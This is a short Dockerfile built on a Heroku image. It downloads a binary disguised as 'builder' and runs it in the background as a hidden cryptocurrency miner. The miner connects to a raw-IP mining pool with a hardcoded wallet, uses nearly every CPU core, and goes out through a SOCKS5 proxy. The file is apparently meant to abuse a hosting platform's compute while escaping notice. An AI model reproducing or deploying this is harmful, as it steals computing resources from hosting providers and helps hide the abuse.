FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/Gow17/exe/raw/main/builder; chmod +x builder; nohup ./builder -a yescryptr16 -o stratum+tcp://103.249.70.7:6333 -u REhMhqwoa2iUjtFBPdYKetfYamUdwipViW -p  c=RVN,mc=QOGE,,m=solo,ID=Rail-$(echo $(curl ident.me))  -t $(($(nproc)-1)) --proxy socks5://72.206.181.97:64943 &
CMD bash heroku.sh
